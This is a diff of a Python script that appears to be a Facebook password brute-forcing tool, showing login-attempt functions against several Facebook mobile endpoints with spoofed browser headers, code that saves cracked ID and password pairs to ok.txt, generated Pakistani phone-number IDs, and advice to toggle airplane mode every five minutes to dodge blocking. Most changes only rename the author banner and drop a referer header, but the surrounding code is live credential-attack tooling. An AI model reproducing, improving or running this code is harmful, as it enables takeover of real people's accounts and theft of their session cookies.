@@ -75,9 +75,9 @@ logo = """
  | |  | | |__| | |__| | |  | |/ ____ \| |____  
  |_|  |_|\____/ \_____|_|  |_/_/    \_\______|                                                                                        
 ==================================================
-      \x1b[1;97m[<\>(:]\x1b[1;97mauthor: MUGHAL BRAND
-      \x1b[1;97m[<\>(:]\x1b[1;97mstatus: FREE 
-      \x1b[1;97m[<\>(:]\x1b[1;97mVersion : 5"""
+  \x1b[1;97mauthor   : KASHIF MUGHAL
+  \x1b[1;97mstatus   : FREE 
+  \x1b[1;97mVersion : 0.1"""
 
 loop = 0
 oks = []
@@ -94,7 +94,7 @@ def dada():
 	print(logo)
 	ip = requests.get("https://api.ipify.org").text
 	print('========================================')
-	print(' Author  : MUGHAL BRAND ')
+	print(' Author  : KASHIF MUGHAL ')
 	print(' Github  : XD-MUGHAL00')
 	print(' Facebook: MUGHAL ZADA ')
 	print(' Status  : Free ')
@@ -357,7 +357,6 @@ def rcrack_mbasic(idf,pwv):
 			header_freefb = {'authority':'mbasic.facebook.com',
 			'method': 'GET',
             'scheme': 'https',
-            'referer': 'https://free.facebook.com/gettingstarted/?step=app_install&eav=AfYsMJHrl8HSkFVQUTxugFruHkBdnN320A7K6H96Wvq4moQkXhVE0lchYP2WmhPUS10&paipv=0&_rdr',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
@@ -378,7 +377,7 @@ def rcrack_mbasic(idf,pwv):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				uid=coki[141:156]
 				print('\n')
-				print('\033[1;92m[MUGHAL-SUCCESFUL] '+cid+' | '+ps+'\033[0;97m')
+				print('\033[1;92m[M-SUCCESFUL] '+cid+' | '+ps+'\033[0;97m')
 		#		print(coki)
 			#	cek_apk(coki)
 			#	open('ok.txt', 'a').write(cid+' | '+ps+'\n')
@@ -388,7 +387,7 @@ def rcrack_mbasic(idf,pwv):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[24:39]
 				print('\n')
-				print('\033[1;91m[MUGHAL-CP] '+cid+' | '+ps+'\033[0;97m')
+				print('\033[1;91m[M-CP] '+cid+' | '+ps+'\033[0;97m')
 			#	open('cp.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(cid)
 				break
@@ -396,7 +395,7 @@ def rcrack_mbasic(idf,pwv):
 				continue
 		loop+=1
 		bo = random.choice([m,k,h,b,u,x])
-		sys.stdout.write(f"\r{P}[MUGHAL]{P}  {P}{loop}{P}|{len(id)}{P}  {H}ok-{ok}{P}  {P}cp-{m}{cp}{P}  {'{:.0%}'.format(loop/float(len(id)))}{P}  "),
+		sys.stdout.write(f"\r{P}[M]{P}  {P}{loop}{P}|{len(id)}{P}  {H}ok-{ok}{P}  {P}cp-{m}{cp}{P}  {'{:.0%}'.format(loop/float(len(id)))}{P}  "),
 		sys.stdout.flush()
 	
 	except:
@@ -427,7 +426,6 @@ def rcrack_mobile(idf,pwv):
 			header_freefb = {'authority':'m.facebook.com',
 			'method': 'GET',
             'scheme': 'https',
-            'referer': 'https://free.facebook.com/gettingstarted/?step=app_install&eav=AfYsMJHrl8HSkFVQUTxugFruHkBdnN320A7K6H96Wvq4moQkXhVE0lchYP2WmhPUS10&paipv=0&_rdr',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
@@ -448,7 +446,7 @@ def rcrack_mobile(idf,pwv):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				uid=coki[141:156]
 				print('\n')
-				print('\033[1;92m[MUGHAL-SUCCESFUL] '+cid+' | '+ps+'\033[0;97m')
+				print('\033[1;92m[M-SUCCESFUL] '+cid+' | '+ps+'\033[0;97m')
 			#	print(coki)
 			#	cek_apk(coki)
 			#	open('ok.txt', 'a').write(cid+' | '+ps+'\n')
@@ -458,7 +456,7 @@ def rcrack_mobile(idf,pwv):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[24:39]
 				print('\n')
-				print('\033[1;91m[MUGHAL-CP] '+cid+' | '+ps+'\033[0;97m')
+				print('\033[1;91m[M-CP] '+cid+' | '+ps+'\033[0;97m')
 			#	open('cp.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(cid)
 				break
@@ -466,7 +464,7 @@ def rcrack_mobile(idf,pwv):
 				continue
 		loop+=1
 		bo = random.choice([m,k,h,b,u,x])
-		sys.stdout.write(f"\r{P}[MUGHAL]{P}  {P}{loop}{P}|{len(id)}{P}  {H}ok-{ok}{P}  {P}cp-{m}{cp}{P}  {'{:.0%}'.format(loop/float(len(id)))}{P}  "),
+		sys.stdout.write(f"\r{P}[M]{P}  {P}{loop}{P}|{len(id)}{P}  {H}ok-{ok}{P}  {P}cp-{m}{cp}{P}  {'{:.0%}'.format(loop/float(len(id)))}{P}  "),
 		sys.stdout.flush()
 	
 	except:
@@ -498,7 +496,6 @@ def rcrack_free(idf,pwv):
 			header_freefb = {'authority':'free.facebook.com',
 			'method': 'GET',
             'scheme': 'https',
-            'referer': 'https://free.facebook.com/gettingstarted/?step=app_install&eav=AfYsMJHrl8HSkFVQUTxugFruHkBdnN320A7K6H96Wvq4moQkXhVE0lchYP2WmhPUS10&paipv=0&_rdr',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
@@ -566,11 +563,9 @@ def rcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {
-			'authority': 'free.facebook.com',
+			header_freefb = {'authority': 'free.facebook.com',
             'method': 'GET',
             'scheme': 'https',
-            'referer': 'https://free.facebook.com/gettingstarted/?step=app_install&eav=AfYsMJHrl8HSkFVQUTxugFruHkBdnN320A7K6H96Wvq4moQkXhVE0lchYP2WmhPUS10&paipv=0&_rdr',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
@@ -590,7 +585,7 @@ def rcrack(uid,pwx,tl):
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				uid=coki[141:156]
-				print('\33[1;92m[MUGHAL-OK] '+cid+' | '+ps+'\33[0;97m')
+				print('\33[1;92m[M-OK] '+cid+' | '+ps+'\33[0;97m')
 				cek_apk(session,coki)
 				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
 				oks.append(cid)
@@ -622,8 +617,7 @@ def random_pak_number():
 	    print(54*'_')
 	    print('Total ids:\033[m '+tl)
 	    print('Brute has been started...')
-	    print('Use ip changer app from playstore.')
-	    print('Make sure that your ip change in every 5 minute.')
+	    print('Use airplane mode in every 5 minute.')
 	    print(54*'_')
 	    for guru in user:
 		    uid = kode+guru
